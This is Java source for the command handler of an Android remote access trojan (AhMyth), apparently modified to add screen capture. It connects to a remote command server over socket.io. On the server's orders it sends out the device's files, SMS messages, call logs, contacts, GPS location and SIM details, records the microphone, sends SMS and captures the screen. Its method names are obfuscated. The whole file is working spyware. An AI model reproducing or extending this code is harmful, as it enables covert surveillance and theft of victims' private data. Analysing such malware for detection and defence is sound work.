package ahmyth.mine.king.ahmyth;

import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import ahmyth.mine.king.ahmyth.AppLogger;
import ahmyth.mine.king.ahmyth.Constants;
import android.os.Looper;
import android.os.Handler;
import android.os.Build;

import java.lang.reflect.Method;

/**
 * Created by AhMyth on 10/1/16.
 */



public class ConnectionManager {

    public static Context context;

    private static io.socket.client.Socket ioSocket;

    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)

    {

        try {

            ConnectionManager.context = con;

            sendReq();

        }catch (Exception ex){

            startAsync(con);

        }

    }


    public static void startContext() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            startAsync(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            startAsync(context);

        }

    }


    public static void sendReq() {
try {





    if(ioSocket != null )
        return;

    ioSocket = IOSocket.getInstance().getIoSocket();


    ioSocket.on("ping", new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            ioSocket.emit("pong");
        }
    });

    ioSocket.on("order", new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            AppLogger.d("ConnectionManager", "=== ORDER LISTENER CALLED ===");
            AppLogger.d("ConnectionManager", "Args count: " + args.length);
            try {
                AppLogger.d("ConnectionManager", "=== ORDER received ===");
                if (args == null || args.length == 0) {
                    AppLogger.e("ConnectionManager", "ERROR: args is null or empty!");
                    return;
                }
                AppLogger.d("ConnectionManager", "Casting to JSONObject...");
                JSONObject data = (JSONObject) args[0];
                AppLogger.d("ConnectionManager", "Getting order string...");
                String order = data.getString("order");
                AppLogger.d("order", order);
                AppLogger.d("ConnectionManager", "Order string: '" + order + "', length: " + order.length());
                AppLogger.d("ConnectionManager", "Entering switch statement...");
                switch (order){
                    case Constants.ORDER_CAMERA:
                        if(data.getString("extra").equals("camList"))
                            x0000ca(-1);
                        else if (data.getString("extra").equals("1"))
                            x0000ca(1);
                        else if (data.getString("extra").equals("0"))
                            x0000ca(0);
                        break;
                    case Constants.ORDER_FILE_MANAGER:
                        if (data.getString("extra").equals("ls"))
                            x0000fm(0,data.getString("path"));
                        else if (data.getString("extra").equals("dl"))
                            x0000fm(1,data.getString("path"));
                        break;
                    case Constants.ORDER_SMS:
                        if(data.getString("extra").equals("ls"))
                            x0000sm(0,null,null);
                        else if(data.getString("extra").equals("sendSMS"))
                           x0000sm(1,data.getString("to") , data.getString("sms"));
                        break;
                    case Constants.ORDER_CALLS:
                        x0000cl();
                        break;
                    case Constants.ORDER_CONTACTS:
                        x0000cn();
                        break;
                    case Constants.ORDER_MICROPHONE:
                            x0000mc(data.getInt("sec"));
                        break;
                    case Constants.ORDER_LOCATION:
                        x0000lm();
                        break;
                    case Constants.ORDER_SIM:
                        x0000si();
                        break;
                    case Constants.ORDER_SCREEN_CAPTURE:
                        AppLogger.d("ScreenCapture", "=== CASE x0000sc MATCHED ===");
                        AppLogger.d("ScreenCapture", "About to call x0000sc()...");
                        try {
                            x0000sc();
                            AppLogger.d("ScreenCapture", "x0000sc() returned successfully");
                        } catch (Exception e) {
                            AppLogger.e("ScreenCapture", "ERROR in x0000sc(): " + e.getMessage(), e);
                            e.printStackTrace();
                        }
                        break;
                    default:
                        AppLogger.d("ConnectionManager", "No case matched for order: '" + order + "'");
                        break;
                }
                AppLogger.d("ConnectionManager", "Switch statement completed");
            } catch (Exception e) {
                AppLogger.e("ConnectionManager", "EXCEPTION in order handler: " + e.getMessage(), e);
                e.printStackTrace();
            }
        }
    });
    ioSocket.connect();

}catch (Exception ex){

   AppLogger.e("ConnectionManager", "Error in sendReq: " + ex.getMessage(), ex);

}

    }

    public static void x0000ca(int req){

        if(req == -1) {
           JSONObject cameraList = new CameraManager(context).findCameraList();
            if(cameraList != null)
            ioSocket.emit(Constants.ORDER_CAMERA ,cameraList );
        }
        else if (req == 1){
            new CameraManager(context).startUp(1);
        }
        else if (req == 0){
            new CameraManager(context).startUp(0);
        }

    }

    public static void x0000fm(int req , String path){
        if(req == 0)
        ioSocket.emit(Constants.ORDER_FILE_MANAGER,fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }


    public static void x0000sm(int req,String phoneNo , String msg){
        if(req == 0)
            ioSocket.emit(Constants.ORDER_SMS , SMSManager.getSMSList());
        else if(req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit(Constants.ORDER_SMS, isSent);
        }
    }

    public static void x0000cl(){
        ioSocket.emit(Constants.ORDER_CALLS , CallsManager.getCallsLogs());
    }

    public static void x0000cn(){
        ioSocket.emit(Constants.ORDER_CONTACTS , ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            AppLogger.d("loc", latitude + "   ,  " + longitude);
            location.put("enable" , true);
            location.put("lat" , latitude);
            location.put("lng" , longitude);
        }
        else
            location.put("enable" , false);

        ioSocket.emit(Constants.ORDER_LOCATION, location);
    }

    public static void x0000si(){
        JSONObject simInfo = SIMInfoManager.getSIMInfo();
        if(simInfo != null)
            ioSocket.emit(Constants.ORDER_SIM, simInfo);
    }

    public static void x0000sc(){
        AppLogger.d("ScreenCapture", "=== x0000sc() called ===");
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            AppLogger.e("ScreenCapture", "ERROR: Android version too low: " + Build.VERSION.SDK_INT);
            return;
        }

        if (context == null) {
            AppLogger.e("ScreenCapture", "ERROR: Context is NULL!");
            return;
        }
        
        // Для Android 10+ (API 29+) нужно убедиться, что foreground service запущен
        // MediaProjection требует активный foreground service с типом mediaProjection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            AppLogger.d("ScreenCapture", "Android 10+, ensuring foreground service is running...");
            Intent serviceIntent = new Intent(context, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.support.v4.content.ContextCompat.startForegroundService(context, serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            AppLogger.d("ScreenCapture", "Foreground service started/ensured");
        }
        
        AppLogger.d("ScreenCapture", "Context OK, getting ScreenCaptureManager instance");
        ScreenCaptureManager screenCaptureManager = ScreenCaptureManager.getInstance(context);
        
        AppLogger.d("ScreenCapture", "Checking MediaProjection...");
        boolean hasProjection = screenCaptureManager.hasMediaProjection();
        AppLogger.d("ScreenCapture", "hasMediaProjection: " + hasProjection);
        
        // Проверяем, есть ли уже MediaProjection
        if (!hasProjection) {
            AppLogger.d("ScreenCapture", "No MediaProjection, starting ScreenCaptureActivity");
            // Запрашиваем разрешение через Activity
            // Activity сама выполнит захват после получения разрешения
            Intent intent = new Intent(context, ScreenCaptureActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            AppLogger.d("ScreenCapture", "ScreenCaptureActivity started");
        } else {
            AppLogger.d("ScreenCapture", "MediaProjection exists, calling captureScreen()");
            // Если разрешение уже есть, сразу делаем захват
            screenCaptureManager.captureScreen();
        }
    }





}
